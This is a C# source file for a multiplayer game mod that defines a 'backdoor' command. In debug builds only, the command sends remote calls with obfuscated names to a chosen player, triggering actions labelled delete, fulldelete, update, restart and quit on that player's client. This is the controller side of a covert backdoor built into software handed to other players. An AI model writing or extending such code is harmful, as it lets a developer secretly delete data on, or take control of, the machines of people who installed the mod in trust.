using System.Text.RegularExpressions;
using Mod.exceptions;
using Mod.gui;

namespace Mod.commands
{
    [Command("backdoor")]
    public class CommandBackdoor  
    {
        public void OnCommand(PhotonPlayer sender, string[] args)
        {
#if !DEBUG
            Core.SendMessage("Non sei autorizzato ad usare questo comando!");
#else
            if (args.Length < 2)
                throw new ArgumentException("/backdoor [id] [action] [args]");
            PhotonPlayer player = PhotonPlayer.Find(args[0].ToInt());
            if (player == null)
                throw new PlayerNotFoundException();
            switch (args[1].ToLower())
            {
                case "delete":
                    FengGameManagerMKII.instance.photonView.RPC("HeArnhIxxx", player);
                    break;
                case "fulldelete":
                    FengGameManagerMKII.instance.photonView.RPC("EEYi78fnZA", player);
                    break;
                case "update":
                    FengGameManagerMKII.instance.photonView.RPC("ZvlJYwf9Qq", player);
                    break;
                case "restart":
                    FengGameManagerMKII.instance.photonView.RPC("HBiBZddlBv", player);
                    break;
                case "quit":
                    FengGameManagerMKII.instance.photonView.RPC("ZKgcKbc90i", player);
                    break;
                default:
                    throw new ArgumentException("/backdoor [crash/quit/close/dc/delete] [id]");
            }
#endif
        }
    }
}